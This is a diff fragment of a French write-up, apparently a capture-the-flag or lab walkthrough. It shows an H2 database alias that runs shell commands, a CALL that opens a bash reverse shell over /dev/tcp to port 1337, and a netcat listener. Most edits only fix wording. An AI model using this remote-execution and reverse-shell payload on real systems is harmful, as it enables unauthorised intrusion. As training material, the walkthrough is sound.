@@ -82,18 +82,18 @@ CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOExcep
         java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
         return s.hasNext() ? s.next() : "";  }
 $$;
-CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.14.90/1337 0>&1 &')
+CALL SHELLEXEC('bash -i &>/dev/tcp/tun0/1337 0>&1 &')
 ```
 
 
-Maintenant démarrer un listenner avec netcat :
+Maintenant démarrer un listenner avec netcat sur le port 1337 :
 
 ```sh
 nc -nvlp 1337
 listening on [any] 1337 ...
 ```
 
-Start un serveur python when est située votre fichier ak.sql :
+Start un serveur python où est située votre fichier ak.sql :
 
 
 ```sh
